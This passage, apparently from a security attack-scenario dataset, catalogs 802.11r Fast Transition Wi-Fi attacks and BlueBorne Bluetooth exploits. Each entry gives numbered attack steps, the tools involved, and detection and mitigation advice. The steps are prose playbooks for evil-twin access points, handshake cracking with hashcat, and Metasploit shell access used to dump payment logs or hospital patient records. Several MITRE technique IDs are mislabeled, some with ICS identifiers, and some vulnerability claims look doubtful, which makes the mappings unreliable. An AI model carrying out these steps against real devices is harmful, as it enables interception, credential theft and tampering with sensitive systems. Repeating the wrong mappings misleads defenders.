- **Impact**: Session hijacking, data decryption
- **Tools**: Scapy, aircrack-ng, modified KRACK scripts
- **Scenario**: An attacker targets 802.11r-enabled networks by reinstalling keys during the FT handshake, forcing the client to reset encryption states.
- **Attack Steps**: Step 1: Set up a rogue AP with the same SSID and BSSID as the legitimate AP.Step 2: Capture 802.11r Fast Transition handshakes using Scapy.Step 3: Modify packets to trigger key reinstallation in the client during the re-association.Step 4: Decrypt or replay packets due to encryption reset.Step 5: Log user data packets and observe potential credential leakage.
- **Detection**: Monitor FT handshake anomalies and multiple reassociation requests
- **Solution**: Patch clients with KRACK fixes; disable 802.11r if unnecessary
- **Tags**: 802.11r, KRACK, FT Handshake, Wi-Fi Security

## Rogue AP Fast Transition Cloning

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Mobile Devices, Laptops
- **Vulnerability**: Clients don't verify AP legitimacy during FT
- **MITRE**: T1185 (Man-in-the-Middle)
- **Impact**: Session interception, phishing
- **Tools**: hostapd-wpe, Wireshark, Scapy
- **Scenario**: Attacker clones legitimate AP using 802.11r Fast BSS info elements to trick roaming clients into connecting to a malicious AP.
- **Attack Steps**: Step 1: Use Wireshark to gather 802.11r Information Elements (IEs) from the real AP.Step 2: Configure hostapd to mimic the exact FT capabilities.Step 3: Broadcast stronger signal to lure the client device.Step 4: Allow the FT reassociation to complete.Step 5: Intercept and relay all traffic or perform credential phishing.
- **Detection**: Rogue AP fingerprinting, DHCP lease analysis
- **Solution**: Enable AP whitelisting, use RADIUS server validation
- **Tags**: FT Cloning, Evil Twin, 802.11r

## FT Reassociation Frame Flood (DoS)

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Enterprise APs
- **Vulnerability**: APs poorly handle flood of FT reassociation frames
- **MITRE**: T1499.001 (Endpoint Denial of Service: Network DoS)
- **Impact**: Client disconnects, roaming failure
- **Tools**: Scapy, aireplay-ng
- **Scenario**: Attacker floods the AP with crafted FT reassociation frames to exhaust processing resources and deny client service.
- **Attack Steps**: Step 1: Identify the BSSID and capabilities of the FT-enabled AP.Step 2: Use Scapy to craft repeated FT reassociation frames with random MACs.Step 3: Flood the AP with thousands of these frames per second.Step 4: Monitor AP logs and client behavior.Step 5: Observe legitimate clients unable to roam or connect.
- **Detection**: Spike in FT reassociation logs and CPU usage
- **Solution**: Rate-limit reassociations, enable anomaly-based intrusion detection
- **Tags**: DoS, FT Flood, Wireless Resource Exhaustion

## Replay of FT Authentication Frames

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Roaming Clients
- **Vulnerability**: No protection against FT auth replay
- **MITRE**: T1557.002 (Adversary-in-the-Middle: Replay)
- **Impact**: Roaming instability, DoS
- **Tools**: Wireshark, Scapy
- **Scenario**: An attacker replays previously captured FT authentication frames to force a client into unwanted roaming behavior.
- **Attack Steps**: Step 1: Capture FT authentication frames during a legitimate roaming event using Wireshark.Step 2: Use Scapy to replay these authentication frames periodically.Step 3: Client sees repeated roam commands and becomes unstable.Step 4: Some clients might disconnect or reauthenticate to attacker-controlled AP.Step 5: Collect client-side logs for analysis.
- **Detection**: Analyze logs for unusual FT attempts
- **Solution**: Implement strict nonce/timestamp validation in clients
- **Tags**: Replay, FT Auth, 802.11r

## Fast Transition Downgrade Attack

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Mixed-mode Wi-Fi networks
- **Vulnerability**: Clients don’t enforce FT requirement
- **MITRE**: T1600 (Weaken Encryption)
- **Impact**: Weak handshake, exposed credentials
- **Tools**: hostapd, Wireshark
- **Scenario**: A malicious AP forces a client to use legacy roaming (non-FT), making them vulnerable to older WPA2 attacks.
- **Attack Steps**: Step 1: Observe a network that supports both FT and legacy roaming.Step 2: Set up a rogue AP mimicking the SSID but omitting FT capability.Step 3: Trick the client into associating with the non-FT AP.Step 4: Capture handshakes and use downgrade attacks (e.g., WPA2 handshake attacks).Step 5: Analyze handshake for password cracking or MITM setup.
- **Detection**: Monitor downgrade patterns in association frames
- **Solution**: Enforce FT-only roaming policy, disable legacy roaming
- **Tags**: Downgrade, WPA2, FT-bypass

## Forced Roaming via Signal Jamming + FT Rogue AP

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Laptops, Smartphones
- **Vulnerability**: FT re-association doesn’t validate AP trust properly
- **MITRE**: T1583.006, T1557.001
- **Impact**: Client session hijack or denial
- **Tools**: aireplay-ng, Wireshark, hostapd, Scapy
- **Scenario**: Attacker jams a client’s signal forcing it to roam, then uses a rogue AP to intercept the FT handshake and collect credentials or disrupt the connection.
- **Attack Steps**: Step 1: Identify the client connected to a legitimate AP.Step 2: Use aireplay-ng to jam the client’s current AP signal.Step 3: Simultaneously run a rogue AP mimicking the SSID and BSSID, broadcasting FT capability.Step 4: When the client tries to reconnect, it will send an FT reassociation to the rogue AP.Step 5: Capture FT handshake messages, then replay or analyze them.Step 6: Use the collected handshake for offline cracking or MITM.
- **Detection**: Monitor jamming attempts and rapid roaming logs
- **Solution**: Enable strict AP validation, disable FT for high-risk zones
- **Tags**: Signal Jamming, Forced Roam, Evil Twin, 802.11r

## FT Cache Poisoning via Rogue AP

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: FT-enabled clients
- **Vulnerability**: Roaming cache can be poisoned without verification
- **MITRE**: T1557.001
- **Impact**: Future sessions hijacked, MITM, data sniffing
- **Tools**: Scapy, hostapd, airbase-ng
- **Scenario**: Attacker poisons the client's roaming cache with fake FT target data, so it roams to rogue APs in future sessions.
- **Attack Steps**: Step 1: Observe FT IEs from the legitimate AP using packet capture.Step 2: Clone FT capability and advertise spoofed BSSID.Step 3: Allow victim client to roam, caching fake AP as a valid roaming target.Step 4: In a future session, bring up rogue AP with same BSSID and higher signal.Step 5: Client will roam automatically and send FT handshake to rogue AP.Step 6: Capture handshake and potentially perform MITM or DoS.
- **Detection**: Look for roaming to unauthorized BSSIDs
- **Solution**: Clear roaming cache after each session or disable FT
- **Tags**: Roaming Cache, Poisoning, 802.11r, MITM

## Timing Attacks on FT Handshake to Identify Devices

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: All roaming clients
- **Vulnerability**: Different vendors use unique FT timing behavior
- **MITRE**: T1596 (Gather Victim Identity Information)
- **Impact**: Targeted attacks, fingerprinting
- **Tools**: Wireshark, tcpdump, Scapy
- **Scenario**: Attacker monitors the timing of FT re-association requests and responses to identify device OS or vendor fingerprint.
- **Attack Steps**: Step 1: Capture multiple FT re-association packets from various devices.Step 2: Measure time intervals between authentication and reassociation responses.Step 3: Analyze FT handshake pattern uniqueness (vendor-specific delays or field orders).Step 4: Use timing patterns to fingerprint devices (e.g., Apple vs Samsung).Step 5: Use this data to build targeted phishing or further rogue AP attacks.
- **Detection**: Unusual frequency of probe and reassociation patterns
- **Solution**: Use MAC randomization, avoid open roaming in public networks
- **Tags**: FT Timing, Fingerprinting, Wi-Fi Metadata

## 802.11r Handshake Manipulation for Crashing Clients

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: IoT Devices, Older Android
- **Vulnerability**: Clients lack FT frame format validation
- **MITRE**: T1499.004 (Resource Hijacking)
- **Impact**: Device crash or freeze
- **Tools**: Scapy, Wireshark, modified firmware
- **Scenario**: Malicious actor crafts malformed FT handshake frames that cause unstable clients to crash or reboot.
- **Attack Steps**: Step 1: Observe correct format of FT reassociation frames using Wireshark.Step 2: Modify reassociation response to include malformed fields or padding overflow.Step 3: Set up rogue AP to send malformed responses during roaming.Step 4: Wait for a client to roam and receive manipulated FT frames.Step 5: Observe behavior — some clients may crash or reboot.Step 6: Document client-side response and firmware logs.
- **Detection**: Analyze crash logs or sudden client disconnects
- **Solution**: Patch firmware, validate handshake packet formats
- **Tags**: FT Crash, Rogue Frame, Frame Overflow

## Offline Cracking of FT-PMK-R1 Keys

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: WPA2-PSK Networks with FT
- **Vulnerability**: PMK-R1 handshake exposed for offline cracking
- **MITRE**: T1110.002 (Brute Force: Password Cracking)
- **Impact**: Gained Wi-Fi credentials
- **Tools**: aircrack-ng, hcxdumptool, hashcat
- **Scenario**: Attacker captures FT handshake and attempts to derive PSK or credentials offline by brute force.
- **Attack Steps**: Step 1: Identify target SSID using FT.Step 2: Use hcxdumptool to capture FT handshake packets.Step 3: Convert packet capture to hash format using hcxpcapngtool.Step 4: Use hashcat with dictionary or brute-force wordlist to crack PMK-R1 key.Step 5: On success, attacker gains password to access network.Step 6: Test login to confirm access.
- **Detection**: Monitor handshake captures and failed login attempts
- **Solution**: Use strong passwords, switch to WPA3, limit roaming
- **Tags**: Hash Extraction, FT Crack, WPA2 PSK

## FT Interleaved MITM Injection

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Laptops, Smartphones
- **Vulnerability**: FT handshake not integrity-verified end-to-end
- **MITRE**: T1557.002
- **Impact**: Persistent manipulation of roaming path
- **Tools**: mitmproxy, Scapy, hostapd
- **Scenario**: Attacker places themselves in the middle during FT handshake and injects malicious FT elements.
- **Attack Steps**: Step 1: Observe FT handshake flow between AP and client.Step 2: Use MITM setup to intercept the FT handshake.Step 3: Modify specific IEs in the handshake (like Mobility Domain ID or R0KH ID).Step 4: Forward modified frame back to the client.Step 5: Client accepts malicious values, altering future roaming behavior.Step 6: Setup future rogue APs that match these parameters.
- **Detection**: Monitor handshake contents for unusual values
- **Solution**: Enforce FT integrity checks, use WPA3 SAE
- **Tags**: MITM Injection, FT IEs, Protocol Abuse

## 802.11r Session Fixation Exploit

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: FT-enabled Enterprise Clients
- **Vulnerability**: Session IDs can be fixed across sessions
- **MITRE**: T1557.001
- **Impact**: Session hijack, unauthorized access
- **Tools**: Scapy, custom Python script
- **Scenario**: Attacker tricks client into binding to a session ID or key already associated with another device.
- **Attack Steps**: Step 1: Capture an FT session where a key pair is established.Step 2: Replay a modified reassociation frame with another device’s MAC but same session key.Step 3: Client or AP accepts the session as valid.Step 4: Allows unauthorized data injection or decryption.Step 5: Log traffic from the hijacked session.
- **Detection**: Monitor duplicate session IDs across clients
- **Solution**: Validate MAC binding per session; clear session state
- **Tags**: FT Fixation, Hijack, Key Reuse

## Probe Request Harvesting with FT IEs

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Mobile phones in public areas
- **Vulnerability**: FT probe requests leak too much metadata
- **MITRE**: T1596, T1589.002
- **Impact**: Target profiling, MAC tracking
- **Tools**: Wireshark, Kismet
- **Scenario**: Malicious actor collects probe requests with FT capability fields to fingerprint roaming devices and identify high-value targets.
- **Attack Steps**: Step 1: Passively monitor wireless traffic around public areas.Step 2: Filter probe requests containing FT capability fields.Step 3: Log device MACs, supported ciphers, mobility domain IDs.Step 4: Correlate known brands or device types from MAC vendors.Step 5: Use data to select high-value targets or spoof devices.
- **Detection**: Look for probe burst patterns with FT fields
- **Solution**: Enable MAC randomization, suppress open probes
- **Tags**: Metadata Leak, Probe Sniffing, Device ID

## Fast BSS Transition Loop Exploit

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Smartphones, Tablets
- **Vulnerability**: Roaming decisions based solely on signal strength
- **MITRE**: T1491 (Resource Exhaustion)
- **Impact**: Denial of service, fast battery drain
- **Tools**: hostapd, airbase-ng
- **Scenario**: Attacker configures rogue APs to keep forcing client devices to roam endlessly, causing battery drain and session drops.
- **Attack Steps**: Step 1: Clone target SSID and FT configuration.Step 2: Configure two rogue APs with alternating BSSIDs and stronger signal.Step 3: As client connects to one, increase signal of the other.Step 4: Client roams, repeats handshake again.Step 5: Continue loop for several minutes to cause disconnection or battery exhaustion.
- **Detection**: Repeated FT roam events in short time frame
- **Solution**: Limit roam rate; use signal thresholds and timers
- **Tags**: Roam Loop, Signal Flip, 802.11r Battery Attack

## Captive Portal Hijack During FT Roam

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Public Wi-Fi Clients
- **Vulnerability**: Captive portal triggers on FT roam without validation
- **MITRE**: T1056.001, T1557.002
- **Impact**: Credential theft
- **Tools**: hostapd-wpe, DNS spoofing tool
- **Scenario**: Attacker intercepts FT reassociation to redirect client to a fake captive portal for phishing credentials.
- **Attack Steps**: Step 1: Deploy rogue AP supporting 802.11r.Step 2: Allow roaming from original AP to rogue AP.Step 3: Immediately respond with HTTP redirect to fake captive portal.Step 4: Capture user-entered credentials or token.Step 5: Forward request to real portal to complete connection unnoticed.
- **Detection**: Monitor DNS redirect logs and fake portal attempts
- **Solution**: Use portal cert pinning, FT-roam aware portal logic
- **Tags**: Captive Portal, Phishing, FT Spoof

## FT R0KH ID Collision Attack

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Enterprise roaming clients
- **Vulnerability**: Clients trust R0KH IDs without verifying AP authenticity
- **MITRE**: T1557.001 (MITM via Wireless)
- **Impact**: Session hijack, credential sniffing
- **Tools**: hostapd, Wireshark, Scapy
- **Scenario**: Attacker sets up a rogue AP reusing the legitimate AP’s R0KH ID (Key Holder Identifier) so clients mistakenly trust it during FT reassociation.
- **Attack Steps**: Step 1: Use Wireshark to capture FT handshake between client and original AP.Step 2: Extract the R0KH-ID field and mobility domain values from FT response.Step 3: Configure rogue AP (hostapd) to broadcast same SSID, R0KH-ID, and Mobility Domain ID.Step 4: Increase signal strength to lure the client to your rogue AP.Step 5: When the client roams, it trusts the fake R0KH ID and completes the FT handshake.Step 6: Capture user traffic or redirect to phishing content.
- **Detection**: Duplicate R0KH detection in network logs
- **Solution**: Use signed FT frames or require strict RADIUS server validation
- **Tags**: FT, R0KH ID, MITM, 802.11r

## Mobility Domain Mismatch Denial

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: FT-enabled mobile and IoT devices
- **Vulnerability**: Mismatched mobility domain not always validated before FT
- **MITRE**: T1499.004 (Service Denial)
- **Impact**: Roaming failure or device crash
- **Tools**: Scapy, airbase-ng
- **Scenario**: Attacker misconfigures FT Mobility Domain ID in broadcast to confuse roaming clients, causing failure to roam or crash.
- **Attack Steps**: Step 1: Clone SSID of target AP and configure a rogue AP using airbase-ng.Step 2: Alter the Mobility Domain ID in beacon/association response frames to a conflicting value.Step 3: When client attempts to roam, it checks for consistent FT parameters.Step 4: Due to mismatch in expected and received mobility domain, FT handshake fails.Step 5: Some devices crash or loop through failed roaming attempts.Step 6: Log repeated authentication failures and roaming failures.
- **Detection**: Logs showing roaming failures with inconsistent MD ID
- **Solution**: Enforce mobility domain validation on both AP and client
- **Tags**: Mobility Domain, FT Misconfig, Denial

## Fast Transition R1KH Spoofing

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: FT-enabled clients
- **Vulnerability**: R1KH ID reused without validation
- **MITRE**: T1557.002 (MITM via Protocol Spoofing)
- **Impact**: Session hijack, credential harvesting
- **Tools**: Wireshark, Scapy, hostapd-wpe
- **Scenario**: The attacker spoofs the R1KH (R1 Key Holder) info to mislead the client into completing FT handshake with a rogue AP.
- **Attack Steps**: Step 1: Passively capture legitimate FT reassociation packets using Wireshark.Step 2: Extract R1KH-ID and other roaming parameters from the handshake.Step 3: Set up a rogue AP that mimics SSID and broadcasts identical R1KH-ID.Step 4: As client roams, it detects known R1KH and attempts FT.Step 5: Client completes handshake, trusting the rogue AP.Step 6: Log captured data or redirect to phishing portal for credential theft.
- **Detection**: Detect unknown BSSID using known R1KH-ID
- **Solution**: Enforce full AP certificate and RADIUS validation
- **Tags**: R1KH Spoof, FT Hijack, Wireless MITM

## Fragmentation Abuse During FT Reassociation

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Older APs or clients with weak parsing logic
- **Vulnerability**: Fragment handling not enforced for FT frames
- **MITRE**: T1203 (Exploit Public-Facing Application)
- **Impact**: Crashes, DoS, possible buffer overflows
- **Tools**: Scapy, aircrack-ng
- **Scenario**: Attacker fragments reassociation frames during FT to exploit client or AP bugs in reassembly logic.
- **Attack Steps**: Step 1: Capture a normal FT reassociation frame using Wireshark.Step 2: Use Scapy to split the frame into non-standard fragments.Step 3: Inject fragmented reassociation frames targeting the AP.Step 4: Poorly coded APs may misinterpret fragments, crash, or allow incorrect associations.Step 5: Repeat for clients to test which devices are vulnerable.Step 6: Analyze logs or crash behaviors.
- **Detection**: Monitor malformed FT frames or crashes
- **Solution**: Enforce proper reassembly rules; upgrade firmware
- **Tags**: Fragmentation, Buffer Exploit, FT Reassociation

## Adaptive Roaming Abuse for Forced FT Loops

- **Attack Type**: Wi-Fi (802.11r) Exploit
- **Target**: Mobile phones, smart devices
- **Vulnerability**: Clients rely only on signal strength for adaptive roaming
- **MITRE**: T1491 (Resource Exhaustion)
- **Impact**: Battery drain, CPU overload
- **Tools**: airbase-ng, Wireshark
- **Scenario**: Exploiter abuses adaptive roaming thresholds to keep triggering FT handshakes repeatedly, draining resources.
- **Attack Steps**: Step 1: Deploy two rogue APs with cloned SSIDs and FT capabilities.Step 2: Configure each AP to broadcast signal strength slightly stronger than the other every 2 seconds.Step 3: The victim device will constantly roam between the APs using FT.Step 4: This causes multiple handshake attempts per minute.Step 5: Monitor battery usage and CPU load on client.Step 6: After 10–15 minutes, device is exhausted or temporarily unusable.
- **Detection**: Look for excessive FT handshake attempts in logs
- **Solution**: Enforce roaming timers or limits on retry rate
- **Tags**: Adaptive Roam, Signal Trick, FT Flood

## Remote Code Execution via BlueBorne on Android 6.0

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Android Phone
- **Vulnerability**: CVE-2017-0785
- **MITRE**: T1210 (Exploitation for Remote Services)
- **Impact**: Full control of device
- **Tools**: blueborne-scanner, Metasploit, btlejuice
- **Scenario**: A hacker exploits an unpatched Android phone with Bluetooth turned on to run code remotely without any interaction.
- **Attack Steps**: Step 1: Enable Bluetooth on a vulnerable Android 6.0 device without pairing it to anything. Step 2: From the attacker laptop, use blueborne-scanner to detect the device in range. Step 3: Use Metasploit with the auxiliary/admin/bluetooth/blueborne module to initiate the exploit. Step 4: The exploit leverages a memory corruption bug in the Bluetooth stack to inject malicious code. Step 5: Attacker gains shell access on the Android device and can browse files or activate features like camera, mic, etc.
- **Detection**: Bluetooth stack monitoring tool, anomaly in system logs
- **Solution**: Apply Android OS security patch; disable Bluetooth when not in use
- **Tags**: blueborne, android, bluetooth-rce

## BlueBorne Attack on Unpaired Windows Laptop

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Windows Laptop
- **Vulnerability**: CVE-2017-8628
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Arbitrary code execution without user interaction
- **Tools**: blueborne-scanner, Python BlueBorne PoC, Wireshark
- **Scenario**: A BlueBorne RCE is demonstrated against a Windows 10 laptop running outdated Bluetooth drivers.
- **Attack Steps**: Step 1: Ensure a Windows 10 laptop with vulnerable Bluetooth drivers is nearby with Bluetooth ON. Step 2: Run blueborne-scanner on attacker machine to identify the vulnerable device. Step 3: Launch the BlueBorne PoC script targeting Windows OS to send malformed L2CAP packets. Step 4: The vulnerable stack processes these without validation, leading to arbitrary code execution. Step 5: Demonstrate opening the calculator app remotely (as PoC) on victim's machine to show access.
- **Detection**: Event logs, unexpected system behavior
- **Solution**: Install latest Bluetooth driver patches
- **Tags**: blueborne, windows10, poc, rce

## Stealth BlueBorne Attack in Public Café

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Multiple (Android, Windows, Linux)
- **Vulnerability**: Multiple CVEs (e.g., CVE-2017-1000251)
- **MITRE**: T1071 (Application Layer Protocol)
- **Impact**: Mass compromise potential in open public areas
- **Tools**: blueborne-scanner, Nmap, BlueZ, Metasploit
- **Scenario**: In a public café, an attacker silently compromises devices with Bluetooth enabled, demonstrating mass exploitation risks.
- **Attack Steps**: Step 1: Attacker sets up a laptop with Kali Linux and a Bluetooth dongle in scanning mode. Step 2: Use blueborne-scanner to detect all nearby Bluetooth-enabled devices. Step 3: For each vulnerable device, run the Metasploit BlueBorne exploit targeting their OS. Step 4: Exploit completes silently without notifying the target. Step 5: Attacker logs MAC addresses, OS types, and control access for reporting.
- **Detection**: Bluetooth connection logs, battery drain, instability
- **Solution**: Public awareness, auto-patch policies, Bluetooth off in public
- **Tags**: public-space-attack, blueborne-scan

## Linux Device Takeover via BlueZ Stack Vulnerability

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Linux Laptop
- **Vulnerability**: CVE-2017-1000251
- **MITRE**: T1068 (Exploitation for Privilege Escalation)
- **Impact**: Remote shell & escalation
- **Tools**: bluez, gatttool, blueborne-exploit.py
- **Scenario**: A vulnerable Linux laptop using the BlueZ Bluetooth stack is compromised via a crafted L2CAP packet sequence.
- **Attack Steps**: Step 1: Set up a test Linux machine with outdated BlueZ stack and Bluetooth active. Step 2: Use blueborne-scanner to ensure it's discoverable. Step 3: Launch custom blueborne-exploit.py which sends malformed SDP and L2CAP packets. Step 4: Buffer overflow vulnerability in the SDP server allows remote shell injection. Step 5: Attacker gains remote terminal access and demonstrates privilege escalation.
- **Detection**: Use of Bluetooth debug logs, GATT server behavior
- **Solution**: Update BlueZ; monitor for malformed packet activity
- **Tags**: bluez, linux, privilege-escalation

## BlueBorne Recon and Exploit Chain Demonstration

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Mixed (Windows, Android, Linux)
- **Vulnerability**: CVE-2017-0781 to CVE-2017-0785
- **MITRE**: T0884 (Exploit Public-Facing Application)
- **Impact**: Full attack demonstration for training
- **Tools**: blueborne-scanner, Wireshark, Metasploit, Nmap
- **Scenario**: A controlled classroom environment demo showing end-to-end discovery, vulnerability detection, and device compromise.
- **Attack Steps**: Step 1: Students place demo devices (phones/laptops) in a test lab with Bluetooth ON. Step 2: Instructor runs blueborne-scanner and shows device info retrieval. Step 3: Use Nmap and Wireshark to demonstrate Bluetooth traffic patterns. Step 4: Run Metasploit BlueBorne module to simulate a successful exploit. Step 5: Log session and highlight defense strategies (patching, turning off discoverability).
- **Detection**: Bluetooth audit logs, student observation
- **Solution**: Disable Bluetooth if unused, keep devices patched
- **Tags**: training, simulation, blueborne, wireshark

## BlueBorne Exploitation on Smartwatch (Android Wear)

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Android Smartwatch
- **Vulnerability**: CVE-2017-0785
- **MITRE**: T1056.001 (Input Capture: Keylogging)
- **Impact**: Silent GPS & mic monitoring
- **Tools**: blueborne-scanner, Android SDK, Metasploit
- **Scenario**: Attacker targets a smartwatch running Android Wear via Bluetooth to access sensor data and GPS location.
- **Attack Steps**: Step 1: Wear OS smartwatch with outdated firmware is kept powered on with Bluetooth active. Step 2: Attacker scans with blueborne-scanner and identifies the smartwatch by MAC and OS fingerprint. Step 3: Using Metasploit’s BlueBorne module, attacker crafts a payload targeting Android Wear Bluetooth stack. Step 4: Exploit triggers a buffer overflow in the Bluetooth service, granting shell access. Step 5: Attacker uses Android shell to access GPS, microphone, and step-count sensors.
- **Detection**: Anomalous Bluetooth traffic, GPS polling
- **Solution**: Patch firmware, disable BT on idle devices
- **Tags**: androidwear, gps, blueborne

## BlueBorne Access via Car Infotainment System

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Automotive Infotainment System
- **Vulnerability**: CVE-2017-1000251
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Audio/GPS control, potential distraction
- **Tools**: blueborne-scanner, Linux Bluetooth Exploit, SDR
- **Scenario**: A hacker gains access to a car's infotainment system via BlueBorne and sends audio commands.
- **Attack Steps**: Step 1: Attacker identifies a parked car with BT-enabled infotainment system (no phone paired). Step 2: Using blueborne-scanner, attacker identifies the system’s OS and MAC address. Step 3: Using SDR and laptop, attacker launches exploit targeting vulnerable BlueZ stack. Step 4: System executes malicious packet and gives shell access to attacker. Step 5: Attacker streams audio remotely or manipulates GPS prompts to mislead driver.
- **Detection**: Unusual audio triggers, syslog entries
- **Solution**: Secure firmware updates via OEM
- **Tags**: bluez, car, infotainment, bluetooth

## BlueBorne Attack on POS Terminal (Linux Kernel)

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: POS Terminal (Linux)
- **Vulnerability**: CVE-2017-1000251
- **MITRE**: T1041 (Exfiltration Over C2 Channel)
- **Impact**: Read/modify transactions
- **Tools**: bluez, hciconfig, gatttool, exploit.py
- **Scenario**: Exploitation of Bluetooth service in a Point-of-Sale terminal to read payment logs.
- **Attack Steps**: Step 1: POS terminal running embedded Linux is Bluetooth-active for pairing with barcode scanners. Step 2: Attacker uses hciconfig to discover terminal via Bluetooth. Step 3: Run crafted exploit.py that sends malformed L2CAP packets to overflow the SDP daemon. Step 4: Gain shell access and dump recent transaction logs from /var/log/payment. Step 5: Optional: Simulate sending fake transaction triggers for lab test.
- **Detection**: Transaction anomalies, tampered logs
- **Solution**: Disable unused BT services
- **Tags**: pos, payment, embedded-linux

## Classroom Demo of BlueBorne in Airplane Mode Exception

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Android Phone (Unpatched)
- **Vulnerability**: CVE-2017-0781
- **MITRE**: T0882 (Disable or Modify Tools)
- **Impact**: Shows false sense of security in UI
- **Tools**: blueborne-scanner, Android phone, Metasploit
- **Scenario**: Attack shows Bluetooth is still active in airplane mode on older Android versions.
- **Attack Steps**: Step 1: Student puts Android phone in airplane mode (with older OS version). Step 2: Instructor scans using blueborne-scanner and still detects Bluetooth active. Step 3: Instructor launches Metasploit BlueBorne module against device. Step 4: Remote shell is obtained, demonstrating vulnerability in OS handling of airplane mode. Step 5: Conclude with classroom discussion and OS patch importance.
- **Detection**: Bluetooth scan logs, OS mismatch
- **Solution**: Update to Android 8+ or patch
- **Tags**: android, airplane-mode, ui-bypass

## BlueBorne in Public Transit: Tablet Compromise

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Public Android Tablet
- **Vulnerability**: CVE-2017-0785
- **MITRE**: T1499 (Endpoint Denial of Service)
- **Impact**: Control infotainment for mischief
- **Tools**: blueborne-scanner, Wireshark, custom exploit
- **Scenario**: Compromise of public tablets in buses/trains running Android OS via BlueBorne.
- **Attack Steps**: Step 1: Target tablet mounted in bus seat (runs Android with outdated firmware). Step 2: Attacker seated nearby scans and identifies BT service is on. Step 3: Run exploit to overflow Bluetooth protocol buffer and access system shell. Step 4: Dump local media, change splash screens, or control app interfaces. Step 5: Optional: Simulate defacing content (e.g., display "Hacked by Student" for effect).
- **Detection**: System logs, modified visuals
- **Solution**: Secure OS lockdown, BT MAC filters
- **Tags**: public-space, transit, android, blueborne

## BlueBorne in Healthcare: Medical Tablet Device Exploit

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Hospital Tablet (Android)
- **Vulnerability**: CVE-2017-0783
- **MITRE**: T1565.001 (Stored Data Manipulation)
- **Impact**: Compromise of patient records
- **Tools**: Metasploit, blueborne-scanner, Bluetooth Adapter
- **Scenario**: Attack targets Android-based tablets used in hospital wards to access patient info.
- **Attack Steps**: Step 1: Hospital tablet in ward is discovered via blueborne-scanner. Step 2: Run exploit from Metasploit on a Linux machine nearby. Step 3: Upon shell access, list files and open local EMR (electronic medical record) app data. Step 4: Dump patient info or add fake entries (for ethical test only). Step 5: Reset system to demonstrate cleanup phase.
- **Detection**: EMR audit trails, access logs
- **Solution**: Limit app permissions, patch OS
- **Tags**: healthcare, android, emr, blueborne

## BlueBorne Attack in Smart Home Hub

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Smart Home Hub
- **Vulnerability**: CVE-2017-1000251
- **MITRE**: T1219 (Remote Access Software)
- **Impact**: Remote control of physical systems
- **Tools**: hciconfig, gatttool, blueborne.py
- **Scenario**: Compromising a smart home controller (Linux-based) to control lights, locks.
- **Attack Steps**: Step 1: Discover smart hub device using hciconfig -a and check MAC address range. Step 2: Run BlueBorne PoC targeting smart hub’s Bluetooth stack. Step 3: Upon successful injection, attacker gains shell access. Step 4: Modify settings to turn lights on/off or unlock smart door (demo only). Step 5: Log changes for reporting and revert system changes.
- **Detection**: Bluetooth debug tools, smart hub logs
- **Solution**: Device firmware updates, isolation
- **Tags**: smarthome, linux, iot, blueborne

## BlueBorne Chain Attack via Malicious Drone

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Mixed Bluetooth Devices
- **Vulnerability**: CVE-2017-0781 to CVE-2017-0785
- **MITRE**: T1595 (Active Scanning)
- **Impact**: Aerial reconnaissance, low interaction
- **Tools**: raspberry pi, Bluetooth dongle, blueborne-scanner
- **Scenario**: A Bluetooth attack is launched from a drone flying over a campus to simulate mass scanning.
- **Attack Steps**: Step 1: Equip drone with Raspberry Pi and long-range Bluetooth antenna. Step 2: Drone flies over a university campus; Pi runs continuous blueborne-scanner. Step 3: Log vulnerable devices and launch passive scans. Step 4: Demo launching BlueBorne script for 1-2 Android test devices from air. Step 5: Retrieve logs from SD card for post-flight analysis.
- **Detection**: Drone logs, RF scan signatures
- **Solution**: Restrict BT range, OTA patching
- **Tags**: drone, aerial-hack, blueborne

## BlueBorne Exploit on Android TV Box

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Android TV Box
- **Vulnerability**: CVE-2017-0785
- **MITRE**: T1491.002 (Transmitted Data Manipulation)
- **Impact**: Media hijack, prank risk
- **Tools**: blueborne-scanner, custom payload, Android Debug Bridge (ADB)
- **Scenario**: Android TV boxes with outdated firmware are attacked to alter display ads and content.
